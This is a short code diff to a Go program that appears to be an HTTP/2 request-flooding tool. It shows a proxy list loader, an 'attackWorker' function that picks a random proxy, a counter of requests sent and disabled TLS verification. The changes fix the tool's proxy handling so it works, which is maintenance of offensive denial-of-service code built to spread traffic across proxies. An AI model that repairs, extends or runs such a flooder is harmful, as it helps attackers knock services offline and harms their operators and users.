@@ -2,13 +2,11 @@ package main
 
 import (
 	"bufio"
-	"context"
 	"crypto/tls"
 	"fmt"
-	"net"
 	"net/http"
+	"net/url"
 	"os"
-	"strings"
 	"sync"
 	"sync/atomic"
 	"time"
@@ -24,9 +22,8 @@ const (
 )
 
 var (
-	proxies     []string
+	proxies      []string
 	requestsSent uint64
-	client      *http.Client
 )
 
 // Load proxies from file
@@ -44,14 +41,17 @@ func loadProxies() {
 	}
 }
 
-// Create HTTP/2 compatible client
+// Create an HTTP/2 compatible client
 func createClient(proxy string) *http.Client {
 	transport := &http.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 	}
 
 	if proxy != "" {
-		transport.Proxy = http.ProxyURL(&net.URL{Host: proxy})
+		proxyURL, err := url.Parse("http://" + proxy)
+		if err == nil {
+			transport.Proxy = http.ProxyURL(proxyURL)
+		}
 	}
 
 	http2.ConfigureTransport(transport)
@@ -64,6 +64,7 @@ func createClient(proxy string) *http.Client {
 func attackWorker(wg *sync.WaitGroup) {
 	defer wg.Done()
 
+	// Select a random proxy
 	proxy := ""
 	if len(proxies) > 0 {
 		proxy = proxies[int(time.Now().UnixNano())%len(proxies)]
